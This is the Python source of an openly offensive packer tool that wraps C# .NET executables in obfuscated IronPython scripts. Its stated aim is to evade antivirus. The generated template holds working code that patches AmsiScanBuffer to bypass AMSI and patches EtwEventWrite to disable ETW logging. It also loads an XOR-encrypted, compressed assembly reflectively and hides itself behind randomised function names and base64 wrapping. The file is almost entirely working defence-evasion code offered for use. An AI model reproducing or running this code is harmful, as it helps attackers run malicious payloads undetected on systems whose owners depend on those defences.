# =================================================================================================================================================================
# This script allows to pack offensive C# .NET executables to help evade antivirus detection. 
# It generates obfuscated Python scripts, designed to run with IronPython (https://ironpython.net/), which embed the original .NET payloads for stealthy execution.
# Important note: this an improved version of the cool project "IronSharpPack".
# Author: https://github.com/JFR-C / GNU General Public License v3.0
# =================================================================================================================================================================
# Features: Reflective C# code loading, AMSI bypass, ETW bypass in user-mode, C# assembly encryption (XOR) and compression (Zlib), script obfuscation.
# =================================================================================================================================================================
# Usage (examples):
# Command to pack offensive (C#) .NET executable files into obfuscated Python scripts:
# + C:\path-to-Python3\python-3.10.4> python.exe Invoke-Python-SharpPacker.py "C:\path-to-folder-containing-C#-exe-to-pack"
# Commands to execute the obfuscated Python scripts:
# + C:\path-to-IronPython3\Net462> ipy.exe Packed-Python-Script-tool1.py
# + C:\path-to-IronPython3\Net462> ipy.exe Packed-Python-Script-tool2.py "-arg argument1"
# =================================================================================================================================================================

import sys
import string
import random
import argparse
import os
import base64
import zlib
from itertools import cycle

template_2 = """
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('<replace_base64_script>')[0]))
"""

template_1 = """
import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import wintypes
from ctypes import *
from itertools import cycle
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

clr.AddReference('System.Management.Automation')
from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal


enc_base64_str = '<enc_base64_string>'

def <AMSI_bypass_func>():
    windll.LoadLibrary('amsi.dll')
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle,
            'AmsiScanBuffer')
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0x00)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size,
            ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((
        System.UInt32(0xB8),
        System.UInt32(0x57),
        System.UInt32(0x00),
        System.UInt32(0x07),
        System.UInt32(0x80),
        System.UInt32(0xC3),
        ))
    Marshal.Copy(patch, 0x00, BufferAddress, 6)


def <ETW_bypass_func>():
    PAGE_EXECUTE_READWRITE = 0x40
    PROCESS_ALL_ACCESS = 0x1F0FFF
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
    GetModuleHandle = kernel32.GetModuleHandleW
    GetProcAddress = kernel32.GetProcAddress
    VirtualProtect = kernel32.VirtualProtect
    WriteProcessMemory = kernel32.WriteProcessMemory
    GetCurrentProcess = kernel32.GetCurrentProcess
    ntdll_handle = GetModuleHandle("ntdll.dll")
    etw_event_write_addr = GetProcAddress(ntdll_handle, b"EtwEventWrite")
    ret_opcode = (ctypes.c_char * 1)(0xC3)
    old_protect = wintypes.DWORD()
    VirtualProtect(
        ctypes.c_void_p(etw_event_write_addr),
        ctypes.c_size_t(1),
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect)
    )
    bytes_written = ctypes.c_size_t()
    WriteProcessMemory(
        GetCurrentProcess(),
        ctypes.c_void_p(etw_event_write_addr),
        ret_opcode,
        ctypes.c_size_t(1),
        ctypes.byref(bytes_written)
    )


def <Base64_To_Bytes_func>(base64_string):
    compressed_data = base64.b64decode(base64_string)
    decompressed_data = zlib.decompress(compressed_data)
    return System.Array[System.Byte](decompressed_data)

def <_xored>(value, key):
    return chr(ord(value) ^ ord(key))

izip = zip

def <xor_func>(data, keys):
    data_pair = izip(data, cycle(keys))
    return ''.join(<_xored>(val, key) for (val, key) in data_pair)

def _decode_string(string):
	return base64.decodebytes(string.encode()).decode()

def decode(enc_data, keys):
    data_decoded = _decode_string(enc_data)
    return <xor_func>(data_decoded, keys)


def <Load_And_Execute_NET_Assembly_func>(command):
    base64_str = decode(enc_base64_str, 'SuperKey')
    assembly_bytes = <Base64_To_Bytes_func>(base64_str)
    assembly = Assembly.Load(assembly_bytes)
    program_type = assembly.GetType('<replace_programname>.Program')
    method = program_type.GetMethod('MainString')

    if method == None:
        method = program_type.GetMethod('Main')
        if method == None:
            method = program_type.GetMethod('Main',
                    Reflection.BindingFlags.NonPublic
                    | Reflection.BindingFlags.Static)

        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        command_args = Array[str]([command])

    result = method.Invoke(None, command_args)
    return result


def main():
    <AMSI_bypass_func>()
    <ETW_bypass_func>()
    parser = argparse.ArgumentParser(description='Execute a command for the .Net assembly')
    parser.add_argument('command', type=str, nargs='?', default='',
                        help='Enter the command to execute (e.g., "help", "-login username").'
                        )
    arguments = parser.parse_args()
    result = <Load_And_Execute_NET_Assembly_func>(arguments.command)
    print(result)

if __name__ == '__main__':
    main()
"""

banner = """

Invoke-Python-SharpPacker v.3.0
.------..------..------..------..------..------..------..------..------..------..------..------..------..------..------..------..------.
|P.--. ||Y.--. ||T.--. ||H.--. ||O.--. ||N.--. ||S.--. ||H.--. ||A.--. ||R.--. ||P.--. ||P.--. ||A.--. ||C.--. ||K.--. ||E.--. ||R.--. |
| :/\: || (\/) || :/\: || :/\: || :/\: || :(): || :/\: || :/\: || (\/) || :(): || :/\: || :/\: || (\/) || :/\: || :/\: || (\/) || :(): |
| (__) || :\/: || (__) || (__) || :\/: || ()() || :\/: || (__) || :\/: || ()() || (__) || (__) || :\/: || :\/: || :\/: || :\/: || ()() |
| '--'P|| '--'Y|| '--'T|| '--'H|| '--'O|| '--'N|| '--'S|| '--'H|| '--'A|| '--'R|| '--'P|| '--'P|| '--'A|| '--'C|| '--'K|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'`------'
"""

def random_name(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def File_To_Base64_Compressed(file_path):
    with open(file_path, 'rb') as file:
        compressed_data = zlib.compress(file.read())
        base64_encoded = base64.b64encode(compressed_data).decode('utf-8')
        return base64_encoded

def File_To_Base64(file_path):
    with open(file_path, 'rb') as file2:
        simply_base64_encoded = base64.b64encode(file2.read()).decode('utf-8')
        return simply_base64_encoded

def _xored(value, key):
    return chr(ord(value) ^ ord(key))
    
izip = zip

def xor(data, keys):
    data_pair = izip(data, cycle(keys))
    return ''.join(_xored(val, key) for (val, key) in data_pair)

def _encode_string(string):
	return base64.encodebytes(string.encode()).decode()

def encode(clear_data, keys):
    data_xoored = xor(clear_data, keys)
    return _encode_string(data_xoored).replace('\n', '')
	
def main():
    print(banner[1:-1])
    if len(sys.argv) < 2 or sys.argv[1] == 'help':
        print('''Enter the path to the directory containing the C# .NET executables you wish to embed into obfuscated Python scripts for execution via IronPython.''')
        return

    assembly_dir = sys.argv[1]
    for file_name in os.listdir(assembly_dir):
        if file_name.endswith('.exe'):
            
            file_path1 = os.path.join(assembly_dir, file_name)
            compressed_assembly = File_To_Base64_Compressed(file_path1)
            enc_base64_string = encode(compressed_assembly, "SuperKey")
            
            template = template_1
            template = template.replace("<enc_base64_string>", enc_base64_string)
            template = template.replace("<replace_programname>", file_name.replace('.exe', ''))

            AMSI_bypass_func = random_name()            
            template = template.replace("<AMSI_bypass_func>", AMSI_bypass_func)

            ETW_bypass_func = random_name()
            template = template.replace("<ETW_bypass_func>", ETW_bypass_func)
            
            Base64_To_Bytes_func = random_name()
            template = template.replace("<Base64_To_Bytes_func>", Base64_To_Bytes_func)

            xor_func = random_name()
            template = template.replace("<xor_func>", xor_func)

            _xored = random_name()
            template = template.replace("<_xored>", _xored)

            Load_And_Execute_NET_Assembly_func = random_name()
            template = template.replace("<Load_And_Execute_NET_Assembly_func>", Load_And_Execute_NET_Assembly_func)

            out_name = "Python-script.py"
            with open(out_name, 'w') as out_file:
                out_file.write(template)

            encoded_script = File_To_Base64("Python-script.py")
   
            template = template_2
            template = template.replace("<replace_base64_script>", encoded_script)

            out_name = "Packed-Python-Script-" + file_name.replace('.exe', '.py')
            with open(out_name, 'w') as out_file:
                out_file.write(template)
                os.remove("Python-script.py")
                
    print("Done!")
if __name__ == "__main__":
    main()
